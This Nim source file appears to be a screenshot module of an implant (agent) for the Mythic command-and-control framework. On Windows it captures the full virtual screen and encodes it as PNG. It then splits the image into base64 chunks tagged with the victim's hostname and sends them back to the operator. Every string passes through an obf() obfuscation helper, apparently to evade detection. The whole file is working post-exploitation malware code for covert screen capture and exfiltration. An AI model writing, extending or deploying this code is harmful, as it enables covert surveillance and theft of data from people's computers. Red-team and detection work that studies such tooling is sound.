import ../utils/debug
import ../utils/strenc
import std/[json, strformat, base64, math]
when defined(linux):
  import posix
when defined(windows):
  import winim/lean
  import std/widestrs
  import pixie

const CHUNK_SIZE = 512000  # 512KB chunks

proc getHostname(): string =
  when defined(linux):
    var buffer: array[256, char]
    if gethostname(cast[cstring](addr buffer[0]), 256) == 0:
      return $cast[cstring](addr buffer[0])
  when defined(windows):
    var buffer: array[256, WCHAR]
    var size: DWORD = 256
    if GetComputerNameW(cast[LPWSTR](addr buffer[0]), addr size) != 0:
      return $cast[WideCString](addr buffer[0])
  return "unknown"

proc captureScreenshotData*(): seq[byte] =
  ## Capture screenshot and return compressed PNG data
  when defined(windows):
    # Get the size of the virtual screen (all monitors)
    let xVirtual = GetSystemMetrics(SM_XVIRTUALSCREEN)
    let yVirtual = GetSystemMetrics(SM_YVIRTUALSCREEN)
    let width = GetSystemMetrics(SM_CXVIRTUALSCREEN)
    let height = GetSystemMetrics(SM_CYVIRTUALSCREEN)
    
    # Create a pixie image to store the screenshot
    var image = newImage(width, height)
    
    # Copy screen to bitmap
    let hScreen = GetDC(GetDesktopWindow())
    let hDC = CreateCompatibleDC(hScreen)
    let hBitmap = CreateCompatibleBitmap(hScreen, width, height)
    
    discard SelectObject(hDC, hBitmap)
    discard BitBlt(hDC, 0, 0, width, height, hScreen, xVirtual, yVirtual, SRCCOPY)
    
    # Set up the bitmap info structure
    var bmi: BITMAPINFO
    bmi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER).DWORD
    bmi.bmiHeader.biWidth = width
    bmi.bmiHeader.biHeight = height
    bmi.bmiHeader.biPlanes = 1
    bmi.bmiHeader.biBitCount = 32
    bmi.bmiHeader.biCompression = BI_RGB
    bmi.bmiHeader.biSizeImage = (width * height * 4).DWORD
    
    # Copy the bitmap data into the pixie image
    discard CreateDIBSection(hDC, addr bmi, DIB_RGB_COLORS, 
                            cast[ptr pointer](unsafeAddr image.data[0]), 0, 0)
    discard GetDIBits(hDC, hBitmap, 0, height.UINT, 
                     cast[pointer](unsafeAddr image.data[0]), addr bmi, DIB_RGB_COLORS)
    
    # Flip the image vertically and swap R/B channels (BGRA to RGBA)
    image.flipVertical()
    for i in 0 ..< image.width * image.height:
      swap(image.data[i].r, image.data[i].b)
    
    # Cleanup GDI resources
    discard DeleteObject(hBitmap)
    discard DeleteObject(hDC)
    
    # Encode as PNG and return as bytes (PNG is already compressed)
    result = cast[seq[byte]](image.encodeImage(PngFormat))
  else:
    result = @[]

proc screenshot*(taskId: string, params: JsonNode): JsonNode =
  ## Screenshot - captures screen and initiates download to Mythic
  ## This is a background task that chunks the screenshot data
  when defined(windows):
    debug "[DEBUG] Capturing screenshot"
    
    try:
      # Capture screenshot
      let screenshotData = captureScreenshotData()
      
      if screenshotData.len == 0:
        return %*{
          obf("task_id"): taskId,
          obf("completed"): true,
          obf("status"): "error",
          obf("user_output"): obf("Failed to capture screenshot")
        }
      
      # Calculate chunks
      let totalChunks = int((screenshotData.len.float / CHUNK_SIZE.float).ceil)
      
      debug &"[DEBUG] Screenshot captured: {screenshotData.len} bytes, {totalChunks} chunks"
      
      # Send initial download response
      let downloadResponse = %*{
        obf("total_chunks"): totalChunks,
        obf("full_path"): "",
        obf("host"): getHostname(),
        obf("filename"): "",
        obf("is_screenshot"): true,
        obf("chunk_size"): CHUNK_SIZE
      }
      
      return %*{
        obf("task_id"): taskId,
        obf("download"): downloadResponse,
        obf("screenshot_data"): encode(screenshotData)  # Store for chunking
      }
    except Exception as e:
      return %*{
        obf("task_id"): taskId,
        obf("completed"): true,
        obf("status"): "error",
        obf("user_output"): obf("Failed to capture screenshot: ") & e.msg
      }
  else:
    return %*{
      obf("task_id"): taskId,
      obf("completed"): true,
      obf("status"): "error",
      obf("user_output"): obf("screenshot command is only available on Windows")
    }

proc processScreenshotChunk*(taskId: string, fileId: string, data: seq[byte], chunkNum: int): JsonNode =
  ## Process a single chunk of the screenshot data
  try:
    # Calculate chunk boundaries
    let offset = (chunkNum - 1) * CHUNK_SIZE
    let endPos = min(offset + CHUNK_SIZE, data.len)
    let chunkSize = endPos - offset
    
    # Extract chunk data
    var chunkData = newSeq[byte](chunkSize)
    copyMem(addr chunkData[0], unsafeAddr data[offset], chunkSize)
    
    # Encode to base64
    let encodedChunk = encode(chunkData)
    
    let chunkResponse = %*{
      obf("chunk_num"): chunkNum,
      obf("file_id"): fileId,
      obf("chunk_data"): encodedChunk,
      obf("chunk_size"): chunkSize
    }
    
    return %*{
      obf("task_id"): taskId,
      obf("download"): chunkResponse
    }
    
  except Exception as e:
    return %*{
      obf("task_id"): taskId,
      obf("completed"): true,
      obf("status"): "error",
      obf("user_output"): obf("Error processing chunk ") & $chunkNum & ": " & e.msg
    }

proc completeScreenshot*(taskId: string, fileId: string): JsonNode =
  ## Complete the screenshot task
  return %*{
    obf("task_id"): taskId,
    obf("completed"): true,
    obf("status"): obf("success"),
    obf("user_output"): fileId
  }
